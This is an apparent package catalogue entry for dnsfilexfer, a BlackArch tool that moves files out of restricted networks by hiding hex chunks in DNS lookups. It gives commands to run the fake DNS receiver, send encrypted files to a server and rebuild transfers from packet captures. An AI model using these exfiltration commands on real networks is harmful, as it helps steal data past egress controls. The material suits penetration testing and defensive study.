---
name: "dnsfilexfer"
categories:
  - blackarch-networking
version: "24.126edcd"
homepage: "https://github.com/leonjza/dnsfilexfer"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-25"
build-system: scripts
license: MIT
meta-checked: "2026-11-09"
github-repo: "leonjza/dnsfilexfer"
github-stars: 76
github-pushed: "2017-05-21"
github-archived: false
github-issues: 1
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.4
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# dnsfilexfer

> Moves files out of a restricted network using nothing but DNS lookups.

## What it's for

dnsfilexfer (leonjza) transfers a file by splitting it into hex chunks carried inside the labels of ordinary DNS queries — traffic that egresses networks where only DNS is allowed. The receiver is a fake DNS server (dns_recv.py, wrapped as `dnsfilexfer-recv` on BlackArch) that reassembles the frames, verifies a SHA-1 checksum of the payload, and can decrypt AES-encrypted transfers when both sides share a secret. The sender (dns_send.py, `dnsfilexfer-send`) can format lookups to be `xxd -r`-friendly so the payload can also be reconstructed offline from a tcpdump -X capture. It is a point-to-point trick for moving small files, not a general-purpose tunnel.

## Typical use cases

### Start the receiving fake DNS server

```
sudo dnsfilexfer-recv --listen 0.0.0.0 --secret
```

Outcome: prompts for the shared secret, then reports "Fake DNS server listening on 0.0.0.0 / 53"; every incoming query is logged as "Processing frame 000N...". When the terminating all-zero frame arrives it prints "[OK] Message seems to be intact and passes sha1 checksum of ...", decrypts the payload, and writes it out between ---START OF MESSAGE--- markers.

### Send a file to the receiver

```
dnsfilexfer-send --server 198.51.100.10 --file message.txt --indentifier exfil-test --secret
```

Outcome: prompts for the same secret, encrypts the file with it, and emits one "[INFO] Sending lookup for : 000N<data>.fake.io" line per chunk as the file leaves via plain DNS lookups, ending with "[INFO] Message sent in N requests". (--indentifier is the upstream spelling of the identifier flag; -S/-F/-I/-s are its short forms, and --domain overrides the fake zone used for lookups.)

### Make transfers recoverable from a packet capture

```
dnsfilexfer-send --server 198.51.100.10 --file message.txt --indentifier exfil-test --secret --xxd
```

Outcome: query labels are generated xxd -r friendly (60 characters per label), so the message can be rebuilt purely from a tcpdump -X capture of the traffic — no live receiver needed on the parsing side.

### Save a received transfer to disk

```
sudo dnsfilexfer-recv --listen 0.0.0.0 --port 53 --secret --outfile received.bin
```

Outcome: performs the same reassembly and checksum verification as above, but writes the decrypted payload to received.bin instead of only printing it (--outfile / -O).

*No corpus evidence — derived from upstream documentation.*
